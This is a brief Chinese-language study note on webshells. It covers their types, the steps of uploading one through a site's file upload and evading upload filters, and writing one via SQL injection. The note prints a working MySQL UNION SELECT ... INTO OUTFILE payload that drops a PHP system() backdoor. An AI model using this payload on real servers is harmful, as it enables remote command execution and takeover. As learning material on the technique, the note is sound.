## Webshell
一種以網頁形式存在的命令執行環境，也稱作**網頁後門**。  
黑客可以通過瀏覽自己放的後門，得到一個shell以操控伺服器。  
1. 大馬  
程式較龐大，調用system func()，通常會以加密隱藏代碼。
   
2. 小馬  
程式小巧   

3. 一句話木馬  
一段小代碼，可做插入，變化多樣。  

### How works
我們可以通過網站自帶的文件上傳功能將webshell送上去，而文件裡的代碼由server解析進一步執行!  
1. 尋找 上傳點   

2. 繞過上傳限制 進行上傳  
* 直接上傳  
* 繞過client端  
* 繞過server端文件類型限制  
* 繞過mime類型  
* 繞過文件類型檢測  
* 過濾不全   

3. 尋找上傳路徑  

4. webshell 作用   


### SQL inj to webshell
MYSQL:  
```
select into outfile(dumpfile)  // mysql write to document
```  
E.G.  
```  
union select 1,2,"<? system($_GET['fuck']) ?>" into outfile "://path"
```

### Ref  
* [千变万化的WebShell-Seebug](https://paper.seebug.org/36/)
